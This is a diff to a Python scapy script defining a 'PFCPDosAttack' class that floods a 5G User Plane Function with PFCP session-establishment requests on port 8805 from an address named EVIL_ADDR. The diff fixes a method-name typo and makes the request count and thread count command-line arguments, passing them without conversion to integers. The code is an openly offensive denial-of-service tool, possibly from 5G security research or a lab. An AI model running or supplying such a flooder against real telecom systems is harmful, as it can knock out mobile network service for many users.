@@ -1,6 +1,11 @@
 from scapy.all import send, IP, UDP
 from scapy.contrib.pfcp import *
 import time, random, ipaddress, threading
+
+
+import sys
+
+
 EVIL_ADDR = "10.100.200.66" 
 UPF_ADDR  = "10.100.200.2"
 DEST_PORT = 8805
@@ -183,7 +188,7 @@ class PFCPDosAttack:
         self.randomize = randomize
         self.lock = threading.Lock()
         
-    def set_radomize(self, randomize=True):
+    def set_randomize(self, randomize=True):
         self.randomize = randomize
         if not self.verbose : return
         if randomize:
@@ -393,5 +398,5 @@ class PFCPDosAttack:
 
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
-objet_dos.set_radomize(True)
-objet_dos.Start_pfcp_session_establishment_flood(reqNbr=1000, num_threads=5)
+objet_dos.set_randomize(True)
+objet_dos.Start_pfcp_session_establishment_flood(reqNbr=sys.argv[1], num_threads=sys.argv[2])
